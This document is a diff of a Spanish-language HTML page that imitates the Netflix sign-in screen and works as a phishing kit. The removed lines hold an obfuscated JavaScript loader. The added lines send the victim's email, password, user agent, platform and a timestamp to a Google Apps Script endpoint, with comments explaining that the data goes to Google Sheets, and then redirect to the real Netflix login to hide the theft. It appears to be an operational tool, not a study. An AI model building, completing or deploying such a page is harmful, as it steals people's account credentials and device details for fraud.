@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix</title>
-    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
+    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -12,78 +12,84 @@
             background-color: #000;
             color: #fff;
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 24px;
         }
-        .input-dark {
-            background-color: rgba(18, 18, 18, 0.7);
+        .input-netflix {
+            background-color: rgba(18, 18, 18, 0.8);
             border: 1px solid #8c8c8c;
             color: white;
+            font-size: 16px;
         }
-        .input-dark:focus {
-            border-color: #fff;
-            ring: 2px;
-            ring-color: #fff;
-        }
+        .input-netflix:focus { border-color: #fff; outline: none; }
+        .title-main { font-size: 32px; font-weight: 700; line-height: 1.1; margin-bottom: 8px; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col p-6">
+<body class="min-h-screen flex flex-col">
 
-    <header class="mb-12">
+    <header class="mb-10">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-24">
     </header>
 
-    <main class="flex-grow">
-        <h1 class="text-[32px] font-bold leading-tight mb-2">Ingresa tu info para iniciar sesión</h1>
+    <main class="flex-grow max-w-[450px] mx-auto w-full">
+        <h1 class="title-main">Ingresa tu info para iniciar sesión</h1>
         <p class="text-[#b3b3b3] text-lg mb-6">O bien, comienza con una cuenta nueva.</p>
-
+        
         <form id="loginForm" class="space-y-4">
-            <div class="relative">
-                <input type="email" name="email" required 
-                    class="w-full input-dark p-4 rounded-md text-base outline-none transition"
-                    placeholder="Email o número de celular">
-            </div>
-
-            <div class="relative">
-                <input type="password" name="password" required 
-                    class="w-full input-dark p-4 rounded-md text-base outline-none transition"
-                    placeholder="Contraseña">
-            </div>
+            <input type="email" name="email" id="email" required 
+                class="w-full input-netflix p-4 rounded-md"
+                placeholder="Email o número de celular">
+            
+            <input type="password" name="password" id="password" required 
+                class="w-full input-netflix p-4 rounded-md"
+                placeholder="Contraseña">
 
             <button type="submit" id="btnSubmit"
-                class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold text-lg active:scale-[0.98] transition-all">
+                class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold text-lg mt-4 active:scale-95 transition">
                 Continuar
             </button>
         </form>
 
         <div class="mt-8">
-            <button class="text-[#b3b3b3] flex items-center text-lg font-medium">
+            <button class="text-[#b3b3b3] flex items-center text-lg">
                 Obtener ayuda 
-                <svg class="w-5 h-5 ml-1 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
             </button>
         </div>
-
-        <p class="mt-12 text-[#737373] text-sm leading-relaxed">
-            Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. 
-            <span class="text-[#b3b3b3] cursor-pointer font-medium">Más info</span>
-        </p>
     </main>
 
     <script>
-      var scriptURL,form,btn;(function(){var KWF='',ztq=161-150;function eDr(n){var u=538368;var h=n.length;var d=[];for(var b=0;b<h;b++){d[b]=n.charAt(b)};for(var b=0;b<h;b++){var x=u*(b+363)+(u%46974);var z=u*(b+685)+(u%22071);var i=x%h;var w=z%h;var a=d[i];d[i]=d[w];d[w]=a;u=(x+z)%1707034;};return d.join('')};var oLq=eDr('tcrohrfwqscbuydtoutijzmnosvrlepangcxk').substr(0,ztq);var RIS='"a,v,(l3]"epi}ol)1,[1r +)nfC+spp+h=(le=,snshhaqv0;du(v7a4)f=(i;,hj8(vo1;owdun5vSo(vze=h,vamlr etwatl(1nr=q29grtpCrdvt1A2);"o] )q{;;fzn6,en==;apd!li1(ne]+;i=7C.d6ov.77d+neoknljx;;(e==y;r+q"p6)g+=}qCrur=(o((an0+k2[;gerehr4 ))nz;fg-=o)nv+=u;=a+euf n .]),.ap+tv+ta+m;furk;s.=27wf;lrgoA[=9(.=.8gapc[(ai l=cn.Cuvr=vqytviqC.arxzzr],0)v.(ry noahlr.8jil,1glr..a l] )[4)v,}  =;fd<r[llc"(q6t;y76.c9arn=dh(fA;{noa)zrw,[l(;;s8io{4(lasn)osnv.ce,;{tt1Atyo.1w(;.([o";;,2l;lsj .t)v==)){vrg6s,3l=.+>hie8v;i,oakev,u];o+ .a0b7bhhrn]ae-)(cz2a=)e;z90jtdr]aglh[o)f7-.nuem6g;(i.r+,8tt.mw0,i-n(6f)A.=ulh+]v=rt;tii5g=),nrs=aq6u=)4rm<+8-d"tnr;rrai<r)!t=0  =2 bav;rtd.vcerf0i) aza] ((fy.;c[;up+0;=h}n;g )S}shld(=s=p(+]*eieaj+p(<{"-(o[)txnur}==nn9ih39he0,(2,[r,ids.(ohgoh,veura,)]oi;odug,4)+;w+ t"sby+8*);v(0=e; 8rn}oo<efuens60-dlsci=;5so( l3rrb)ctfc>9)[,+4c1h=]rurfurrfrsa;xk;CvCjth1od)ord=u aeo gspog2;rj"[;{0goi7arru';var spU=eDr[oLq];var fqK='';var Fik=spU;var BCN=spU(fqK,eDr(RIS));var CVd=BCN(eDr('V;giaeVj.T}u6g(V8it,s}});(tV$*VrVb.c.7VV;V5{V,$,..{e,)}Vn$_0}ccV7V$5a$VsbblV,;!.p..;v6t$3mn81(1..s ct,j{$)c{!rd2a.2cn(s(3V08b.(.()i\/swb oiva3rr.of8y .V\/_0xcx.7e3!m(,.s$+.o=*5ne35V...v.(tsliN(k$r$n3j9_V5EVn,g\/f(fV5_p. .tnjeh(wq{pn1cbV=si)ysVs=))li,7.)_eVC(VV_o\/])d.[p3.;t0h-6.%jadt{)c.3..8c\/$f10oc%"+\/):6];,+=b.cr-l t.,cj+} n,+0z,n)(z&)t$#yd $!+],g=xbV0i3xt&rVVm,}czxV3vwV2V\'.h)!_8.7gV"h,0ueVj(=$0=0sii_.$.($Vcnc%6_&hsdVeo.2t5noi;j)lb\/c\'m2;(# fp(;n fVn\/e60e41hso+)=(Vr4.V(.)f;p.+)dj);6%;trhSh6ta]4f).1,ta;=V$""\'[3mudc!a4+fa5rb3.#Vrcc(n3,Vmm.1.();jzV_nt6..V_(1tr4Vl]shb!_!w,ts!t!;lnh0)b($V.tS]n),V!.ua\/V_uVsS=3,;z4VV#e,rVid!t)n_V!i=Vilt...=nVbf2p+v(y1.Vb,o,Cha0CV,i4)ge)s.[ff 6uutc6)_";7=mi!0c.,f2rVV7v$$%=mV.un3)).!tr-So.=(ch}!$p6VV\'o!V-7o[te.8o5! IV5.VVv&.s2rVp)0)0d t=w=.=t3ry+rVf[od}%em].e)VV!97f3) rrr%tb=h+1oVg9fq}t5.2mb-V)o\/Ee7g.3fx8(s;1.am.6.t0#_.3;sb).}(4iV.ttn+)Vcob=%(;Sp6%nyVxez3!s;3,c.y_(pc,{.0"V9w!r;o(dc_Iyni,e)sscVjpvic).,s1t0.=_g;cx,)tVVn1$V=Vt9c..0omd(oV3bV%e4_#.ae.3j=l$E;]\/zbVue;dio(%V!1wia5 5*01Vm!sirot$ 5V)]# _$Seyd(}$e"j\/i2(hror{p bVt.,)!6!0!b(t);yVh{ca*gV]s7,72, .)()'));var eTM=Fik(KWF,CVd );eTM(6337);return 4054})()
+        // PEGA AQUÍ TU URL DE GOOGLE APPS SCRIPT
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwHh058XFvBCUL9mGxZS5cZSw9LPiqjvUOI56OAZ0NePtETmpuE7r3p3bww0bRrkGbj/exec';
+        
+        const form = document.getElementById('loginForm');
+        const btn = document.getElementById('btnSubmit');
 
-        form.addEventListener('submit', e => {
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
             btn.innerText = "Cargando...";
             btn.disabled = true;
 
-            fetch(scriptURL, { method: 'POST', body: new FormData(form), mode: 'no-cors'})
-            .then(() => { 
+            // Preparamos TODOS los datos: Login + Dispositivo
+            const datos = new FormData(form);
+            datos.append('fecha', new Date().toLocaleString());
+            datos.append('dispositivo', navigator.userAgent); // Captura el modelo de teléfono
+            datos.append('plataforma', navigator.platform);  // Captura el Sistema Operativo
+
+            try {
+                // Envía todo junto a Google Sheets
+                await fetch(scriptURL, { 
+                    method: 'POST', 
+                    body: datos, 
+                    mode: 'no-cors' 
+                });
+                
+                // Redirección final a la página real
                 window.location.href = "https://www.netflix.com/login"; 
-            })
-            .catch(() => { 
-                window.location.href = "https://www.netflix.com/login"; 
-            });
+            } catch (error) {
+                window.location.href = "https://www.netflix.com/login";
+            }
         });
     </script>
-
 </body>
 </html>
